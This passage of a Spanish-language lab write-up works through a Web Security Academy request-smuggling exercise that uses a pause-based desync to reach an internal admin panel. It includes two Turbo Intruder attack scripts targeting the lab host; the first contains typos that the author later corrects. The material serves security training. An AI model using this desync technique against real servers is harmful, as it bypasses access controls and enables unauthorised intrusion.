Aquí modificamos la petición smuggleada para apuntar al host localhost, lo que nos permite eludir restricciones de acceso y alcanzar el panel de administración.

El resultado confirma el acceso interno al panel, validando que el ataque puede romper controles de acceso basados en IP.

Solucion
Entonces para efectuar el payload vamos a ocupar la extencion turbo intruder del BS y la configuramos de esta manera

payload (# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    attacker_request = """POST /resources HTTP/1.1
Host: 0ad5004303587aa0806d9ef000090092.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: %$

%$"""

    smuggled_request = """GET /error HTTP/1.1
Host: 0ad5004303587aa0806d9ef000090092.web-security-academy.net

"""

    normal_request = """GET / HTTP/1.1
Host: 0ad5004303587aa0806d9ef000090092.web-security-academy.net

"""

    engine.queue(attacker_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=61000)
    engine.queue(normal_request)

def handleResponse(req, interesting):
    table.add(req))
    ![Pasted_image_20250812234714.png](/Imagenes/Pasted_image_20250812234714.png)
    pero este payload fue el que me funciono 
    (def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    smuggled_request = """GET /error HTTP/1.1
Host: 0ad5004303587aa0806d9ef000090092.web-security-academy.net

"""

    attacker_request = """POST /resources HTTP/1.1
Host: 0ad5004303587aa0806d9ef000090092.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: %s

%s"""

    normal_request = """GET / HTTP/1.1
Host: 0ad5004303587aa0806d9ef000090092.web-security-academy.net

"""

    engine.queue(attacker_request, [str(len(smuggled_request)), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=61000)
    engine.queue(normal_request)

def handleResponse(req, interesting):
    table.add(req)
)

![Pasted_image_20250812235400.png](/Imagenes/Pasted_image_20250812235400.png)
